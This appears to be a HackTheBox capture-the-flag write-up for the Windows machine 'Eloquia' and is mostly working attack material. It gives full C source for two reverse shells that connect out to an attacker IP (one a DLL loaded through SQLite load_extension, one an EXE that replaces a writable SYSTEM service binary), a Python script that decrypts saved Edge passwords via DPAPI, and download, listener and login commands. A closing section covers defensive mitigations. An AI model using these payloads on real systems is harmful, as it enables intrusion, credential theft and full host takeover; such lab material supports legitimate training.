---
title: Eloquia
os: Windows
difficulty: Insane
tags:
  - SQLite
  - DLL Injection
  - loadextension()
  - DPAPI Decryption
  - Edge Passwords
  - Writable Service Binary
  - Privilege Escalation
date: 2025-05-17
---

# 🛡️ HTB - Eloquia (Insane)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Insane-red?style=for-the-badge" alt="Insane Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Eloquia
- **Operating System:** Windows Server 2019 (Build 17763)
- **Difficulty:** Medium
- **Date of Scan:** 2025-05-17
- **Vulnerabilities:** SQLite `load_extension()` Arbitrary DLL Execution, Chromium/Edge DPAPI Password Exposure, Writable Windows Service Executable Hijacking (Failure2Ban)

---

## Step 1 - Access the Admin Panel

- 🔍 *Access the admin panel using the following credentials:*
  - **CREDS:** admin : MyEl0qu!@Admin

---

## Step 2 - Initial Foothold

- 🔍 *while exploring the admin panel we can see some utilities, as SQL Explorer, which execute SQL commands.*

### Checking the SQL Version

- 🔍 *go to `eloquia.htb/dev/sql-explorer/new/` endpoint (You'll see the section where you can execute SQL commands).*

```sql
select sqliteversion();
```

```text
sqliteversion()
3.45.1
```

- 🔍 *it provides a dedicated SQLITE backend supports, but we can't just directly execute any RCE commands.*
- 🔍 *But while searching more, I've got a misconfiguration. That the SQLITE has a Function Enabled named loadextension();*
- 🔍 *loadextension() imports the libraries without validation.*
- 🔍 *So We can trigger this misconfiguration and use our own .dll reverse shell payload to get the initial foothold.*

---

## Step 3 - Payload Creation

- 🔍 *lets first create a Custom C Reverse Shell payload that can be uploaded later.*

```c
/*
* SQLite Reverse Shell DLL for Eloquia HTB
* Compile: x86_64-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws2_32
*/
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "YOURIP"
#define LPORT YOURPORT

// Function that will be called when DLL is loaded
__declspec(dllexport) void revshell(void) {
   WSADATA wsaData;
   SOCKET sock;
   struct sockaddr_in addr;
   STARTUPINFO si;
   PROCESSINFORMATION pi;
   char cmd[] = "cmd.exe";
   
   // Initialize Winsock
   if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
       return;
   }
   
   // Create socket
   sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
   if (sock == INVALID_SOCKET) {
       WSACleanup();
       return;
   }
   
   // Setup address structure
   addr.sin_family = AF_INET;
   addr.sin_addr.s_addr = inet_addr(LHOST);
   addr.sin_port = htons(LPORT);
   
   // Connect to listener
   if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
       closesocket(sock);
       WSACleanup();
       return;
   }
   
   // Setup process startup info
   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
   si.dwFlags = STARTF_USESTDHANDLES;
   si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
   
   // Create process with redirected I/O
   ZeroMemory(&pi, sizeof(pi));
   if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
       closesocket(sock);
       WSACleanup();
       return;
   }
   
   // Wait for process to exit
   WaitForSingleObject(pi.hProcess, INFINITE);
   
   // Cleanup
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);
   closesocket(sock);
   WSACleanup();
}

// Alternative: Simple test function that shows MessageBox
__declspec(dllexport) void test(void) {
   MessageBox(NULL, "DLL Loaded Successfully!", "Eloquia HTB", MB_OK | MB_ICONINFORMATION);
}

// DLL entry point - called when DLL is loaded
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   switch (fdwReason) {
       case DLL_PROCESS_ATTACH:
           // Uncomment ONE of these:
           // test();  // For testing only - shows MessageBox
           revshell(); // For actual reverse shell
           break;
       case DLL_PROCESS_DETACH:
           break;
       case DLL_THREAD_ATTACH:
           break;
       case DLL_THREAD_DETACH:
           break;
   }
   return TRUE;
}
```

- 🔍 *The above C program can be used to get the reverse shell, this program includes standard Win32 API calls (WSASocket, CreateProcess) to spawn cmd.exe and tunnel the input/output over a TCP socket.*

> [!NOTE]
> before compiling please make the necessary changes for IP and port.

- 🔍 *Save it and compile it using:*

```bash
x86_64-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws2_32
```

---

## Step 4 - Upload the Payload

1. **Upload this payload**: Go to `eloquia.htb/accounts/admin/Eloquia/article/` (here you'll see the list of articles that are saved). Choose any article, and you can upload the payload at the place of banner image, which is stored at `static/assets/images/blog/xpl.dll`.
2. **Setup listener**: Now on Your Terminal Setup a netcat listener.
3. **Make a query**: Go to endpoint `eloquia.htb/accounts/admin/explorer/query/1/change/` and fill out the necessary fields. In the SQL query Section write this:
   ```sql
   SELECT loadextension('static/assets/images/blog/xpl.dll');
   ```
4. **Trigger Payload**: In the Top Right Corner you'll see a "View on Site" Button, click on it to Trigger the Payload. It will lead you to an endpoint `eloquia.htb/accounts/admin/r/9/X/` Where X specifies the ID of Query.
5. **Check the Listener**: you may have got a shell.

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.**] from (UNKNOWN) [10.10.11.99] 52123
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami
eloquia\web
```

---

## Step 5 - Obtain the User Flag

- 🔍 *The web User has the User flag, to obtain it just go to `C:/Users/Web/Desktop`.*
- 🔍 *and then run `type user.txt` (cause windows CMD does not provide cat).*

---

## Step 6 - Dumping the Credentials

- 🔍 *While Enumerating the Shell, I saw that the Microsoft Edge Folder located at `C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default` contains credentials.*

- 🔍 *Key files found:*
  - **Login Data:** An SQLite database containing saved credentials (passwords are encrypted with AES-256-GCM).
  - **Local State:** A JSON file containing the encrypted master key used to decrypt the database (encrypted using DPAPI).

> [!NOTE]
> **DPAPI Decryption Theory:**
> Chromium-based browsers (Edge, Chrome) encrypt saved passwords using AES-256-GCM. The AES key itself is stored in the Local State file, but it is encrypted using the Windows DPAPI (Data Protection API).
> 
> DPAPI encryption is tied to the user’s login session. Since we are executing code as the user (web), we can transparently call the Windows API `CryptUnprotectData` to decrypt the master key. Once we have the master key, we can decrypt the passwords in Login Data.

- 🔍 *For this task we will be using a Python Script.*

> [!TIP]
> If you have any trouble finding python on the box, just go to `C:\Program Files\Python311`, there you'll get the full python Framework (which can only be used in that directory).

- 🔍 *Lets make the Script:*

```python
#!/usr/bin/env python
import os, json, base64, sqlite3, ctypes, tempfile

# DPAPI Function
class DATABLOB(ctypes.Structure):
   _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_voidp)]

crypt32 = ctypes.windll.crypt32

def dpapidecrypt(data):
   if not data: return None
   inblob = DATABLOB()
   inblob.cbData = len(data)
   buffer = ctypes.create_string_buffer(data)
   inblob.pbData = ctypes.addressof(buffer)
   outblob = DATABLOB()
   if crypt32.CryptUnprotectData(ctypes.byref(inblob), None, None, None, None, 0, ctypes.byref(outblob)):
       result = ctypes.string_at(outblob.pbData, outblob.cbData)
       ctypes.windll.kernel32.LocalFree(ctypes.c_voidp(outblob.pbData))
       return result
   return None

# Paths
edgepath = r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data"
localstate = os.path.join(edgepath, "Local State")
logindb = os.path.join(edgepath, "Default", "Login Data")

print("[*] Edge Password Decryptor")
print(f"[*] Master Key: c7f1ad7b079947b4bb1dc53b87404406...")

# Try to read DB directly (no copy)
try:
   conn = sqlite3.connect(logindb)
   cursor = conn.cursor()
   cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
   rows = cursor.fetchall()
   conn.close()
   
   print(f"[+] Found {len(rows)} credentials in database")
   
   # Try to import cryptography
   try:
       from cryptography.hazmat.primitives.ciphers.aead import AESGCM
       
       # Get master key first
       with open(localstate, 'r') as f:
           encryptedkey = json.load(f)['oscrypt']['encrypted_key']
       encryptedbytes = base64.b64decode(encryptedkey)
       masterkey = dpapidecrypt(encryptedbytes[5:])
       
       if masterkey:
           print("[+] Decrypting passwords...")
           found = 0
           
           for url, username, encryptedpw in rows:
               if username and encryptedpw and encryptedpw[:3] == b'v10':
                   try:
                       iv = encryptedpw[3:15]
                       ciphertext = encryptedpw[15:-16]
                       tag = encryptedpw[-16:]
                       aesgcm = AESGCM(masterkey)
                       password = aesgcm.decrypt(iv, ciphertext + tag, None).decode('utf-8', errors='ignore')
                       
                       print(f"\n[+] {url[:60]}")
                       print(f"    User: {username}")
                       print(f"    Pass: {password[:30]}")
                       found += 1
                   except:
                       pass
           
           if found > 0:
               print(f"\n[+] Successfully decrypted {found} passwords!")
           else:
               print("[!] Could not decrypt any passwords")
       else:
           print("[!] Could not get master key")
           
   except ImportError:
       print("[!] Install cryptography: pip install cryptography")
       print("[*] For now, showing URLs and usernames only:")
       for url, username,  in rows[:10]:  # Show first 10
           if username:
               print(f"  {url[:50]} - {username}")
       
except sqlite3.OperationalError as e:
   print(f"[!] Database locked. Close Edge browser and try again.")
except Exception as e:
   print(f"[!] Error: {e}")
```

- 🔍 *Save the above Script in Your Linux machine, and then send it to target via Curl.*
- 🔍 *Then Go to the `C:\Program Files\Python311` directory, and use python:*

```cmd
C:\Program Files\Python311>python --version
Python 3.11.9
```

- 🔍 *Now that we can See Python is there and can be used to run the script, Now Lets RUN the Script:*

```cmd
C:\Program Files\Python311>python C:\Web\Temp\Decrypt.py
[*] Edge Password Decryptor
[*] Master Key: c7f1ad7b079947b4bb1dc53b87404406...
[+] Found 4 credentials in database
[+] Decrypting passwords...

[+] http://eloquia.htb/accounts/login/
   User: Olivia.KAT
   Pass: S3cureP@sswdIGu3ss

[+] https://eloquia.htb/
   User: test
   Pass: testtest1234!

[+] https://chatgpt.com/
   User: olivia.kat
   Pass: S3cureP@sswd3Openai

[+] Successfully decrypted 3 passwords!
```

- 🔍 *After Running the Script we Got Some valid Creds:*
  - **User:** Olivia.KAT
  - **Pass:** S3cureP@sswdIGu3ss

---

## Step 7 - Privilege Escalation

- 🔍 *Now that we have valid Creds dumped, lets try getting a Winrm Session for that user.*

```bash
evil-winrm -i 10.10.11.99 -u 'olivia.kat' -p 'S3cureP@sswdIGu3ss'
```

```text
Evil-WinRM shell v3.7
                                       
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                           
                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                      
                                       
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents>
```

- 🔍 *After getting the evil-winrm session we can look for the Services that are running.*
- 🔍 *To Check what services are running on the target, we can use the registry:*

```powershell
$services = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*"
$services | Select-Object PSChildName, @{n="DisplayName";e={$_.DisplayName}}, @{n="ImagePath";e={$_.ImagePath}} | Format-Table -AutoSize
```

- 🔍 *After That You'll Get a Bunch of services List. So There is a Custom Software Running with the path `HKLM\SYSTEM\CurrentControlSet\Services\Failure2Ban` and Binary Path `C:\Program Files\Qooqle IPS Software\Failure2Ban`.*

> [!NOTE]
> **What is Failure2Ban:**
> it is like an IDS/IPS System that checks windows logs for failed login attempts or brute-Force Attacks and bans IP addresses after too many failures.

- 🔍 *Key Findings: When we look for the Service registry Entry of Failure2Ban:*

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Failure2Ban" | Select-Object *
```

```text
Type         : 16
Start        : 2
ErrorControl : 1
ImagePath    : C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
ObjectName   : LocalSystem
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Failure2Ban
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName  : Failure2Ban
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

- 🔍 *Above We can see that this **Failure2Ban Runs with LocalSystem(Administrator) Privileges**.*
- 🔍 *As We Know that it Runs With SYSTEM Privileges, Now lets check, does the current User Olivia.kat has any read, Write, execute Permissions on that Service or not:*

```powershell
Get-Acl "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
```

```text
    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug

Path            Owner                  Access
----            -----                  ------
Failure2Ban.exe BUILTIN\Administrators ELOQUIA\Olivia.KAT Allow  Write, ReadAndExecute, Synchronize...
```

- 🔍 *In the above output We can see That Current User Olivia.kat has Writable Privileges.*

> [!IMPORTANT]
> **Attack Plan:**
> 1. Create an `exploit.c` file for a reverse shell.
> 2. Compile it with mingw32-gcc with output file as an `.exe`.
> 3. Send it to the target via `Invoke-WebRequest`.
> 4. Set up a Netcat Listener.
> 5. Repeatedly overwrite the content of the service `Failure2Ban.exe` with `Failure.exe`.

### Execution

#### 1. Create Exploit.c

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define CLIENT_IP   "YOUR IP"
#define CLIENT_PORT 4444

int main(void) {
    WSADATA wsaData;
    SOCKET sockt;
    struct sockaddr_in sa;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockt == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

    while (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        Sleep(5000);
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;

    char cmd[] = "cmd.exe";

    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }

    closesocket(sockt);
    WSACleanup();
    return 0;
}
```

#### 2. Compile

```bash
x86_64-w64-mingw32-gcc Exploit.c -o Failure.exe -lws2_32 -mwindows -s -Wl,--strip-all
```

#### 3. Upload & Run on Target

```powershell
Invoke-WebRequest -Uri "Your IP":8000/Failure.exe -OutFile Failure.exe
```

#### 4. Setup Listener

```bash
nc -lvnp 4444
```

#### 5. Overwrite Service Executable

```powershell
while ($true) {
    try {
        Copy-Item "./Failure.exe" "./Failure2Ban.exe" -Force -ErrorAction Stop
        Write-Host "[+] Overwrite successful"
        break
    } catch {
    }
}
```

- 🔍 *And wait for 5-6 Minutes. Until it Iterates.*

---

## Step 8 - Access Gained

- 🔍 *Check On The Listener:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.99] 51700
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---

## Step 9 - Obtain the Root Flag

- 🔍 *Go get the Root flag at `C:\Users\Administrator\root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Host Security & System Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Eloquia host. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Permissive SQLite `load_extension()` Arbitrary DLL Loading

> [!WARNING]
> **Vulnerability Profile:**
> The SQLite database engine was configured with extension loading enabled. This allowed administrative SQL console users to issue `SELECT loadextension('static/assets/images/blog/xpl.dll');` to load arbitrary, user-controlled dynamic link libraries (.dll) into the database process.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Allowing SQLite database extensions to load native binaries directly results in instant remote code execution (RCE) on the server. If an attacker can write binary files to any directory (e.g., via simple image upload filters) and has the ability to execute SQLite commands, they can bypass security boundaries and execute arbitrary commands under the privileges of the web application daemon (`eloquia\web`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable SQLite extension loading completely. In modern SQLite API wrappers, loading is disabled by default. Explicitly enforce this by calling `sqlite3_enable_load_extension(db, 0)` in server-side DB configurations.
> - **Remediation:** Do not expose raw SQLite console interfaces to application environments. Restrict access to explorer queries using parameterized calls and strictly validate keywords.
> - **Detection:** Monitor web directory filesystem additions for binary files (`.dll`, `.exe`, `.so`, `.sys`). Trigger alerts if any database engine process (e.g., SQLite wrappers or web workers) attempts to resolve native system library loads outside standard directory sets.

---

### 🔴 Weak File Upload Sanitization and Host Isolation

> [!WARNING]
> **Vulnerability Profile:**
> The user-facing article banner image upload utility lacked extension verification filters, allowing users to upload binary DLL files directly into the web-accessible static media folders (`static/assets/images/blog/`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Relying on loose, blacklist-based, or non-existent file validation permits the upload of high-risk assets (such as web shells or DLL payloads). If these folders are placed inside the active web root, they serve as immediate payload staging grounds reachable by database engine extension loaders or server-side includes.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Implement a strict **whitelist** of permitted file extensions (e.g., `.png`, `.jpg`, `.jpeg`). Never rely on extension blacklists.
> - **Remediation:** Store uploaded documents in segregated, non-executable directories located completely outside the web application's root directory.
> - **Detection:** Monitor dynamic web paths for non-image assets. Alert on dynamic reads or triggers targeting binary attachments.

---

### 🔴 Insecure Storage of Saved Browser Credentials (DPAPI Exposure)

> [!WARNING]
> **Vulnerability Profile:**
> Administrative user accounts saved corporate portal login credentials directly within the Microsoft Edge password manager, which encrypts the master database key using Windows Data Protection API (DPAPI).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> While DPAPI secures browser keys from external system accounts, it permits transparent decryption to any program operating within the active owner's logon session. Once an attacker obtains a shell as the user (e.g., `web`), they can programmatically call `CryptUnprotectData` via simple python scripts to decrypt the browser master key and immediately harvest plain text passwords (e.g., `Olivia.KAT` credentials) to pivot across network boundaries.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce corporate Active Directory Group Policies (GPO) to globally disable saved browser credential vaults. Set `Enable saving passwords to the password manager = Disabled` for Edge and Chrome.
> - **Remediation:** Mandate the use of centralized, robust enterprise password managers that require multi-factor authentication (MFA) and do not store credentials in local DPAPI-tied vaults.
> - **Detection:** Set up host endpoint monitoring to alert on anomalous processes (like python scripts or custom CMD tools) attempting to open or read files inside `%LocalAppData%\Microsoft\Edge\User Data\`.

---

### 🔴 Insecure Service Executable Permissions (Writable Failure2Ban Binary)

> [!WARNING]
> **Vulnerability Profile:**
> The highly-privileged local service `Failure2Ban` (which runs under `LocalSystem` credentials) points to a binary path (`C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe`) that grants full `Write` access to low-privilege domain users (`ELOQUIA\Olivia.KAT`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Permitting standard users to modify or overwrite service executables creates an immediate vector for local privilege escalation (LPE). Attackers can easily replace the legitimate service binary with a custom reverse shell payload. When the service recycles or triggers, the payload executes under `nt authority\system` context, fully compromising the host system.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce the Principle of Least Privilege on system binaries. Standard users must **never** possess write or modify access on any executable paths located under `C:\Program Files\` or `C:\Windows\`. All system service folders must be owned by `TrustedInstaller` or `Administrators`, with standard users restricted exclusively to Read and Execute.
> - **Remediation:** Set strict DACL permissions on service folders to prevent standard users from creating, modifying, or renaming binaries.
> - **Detection:** Deploy File Integrity Monitoring (FIM) tools to track modifications to active `.exe` files in system directories, immediately alerting on any write requests originating from non-admin accounts.
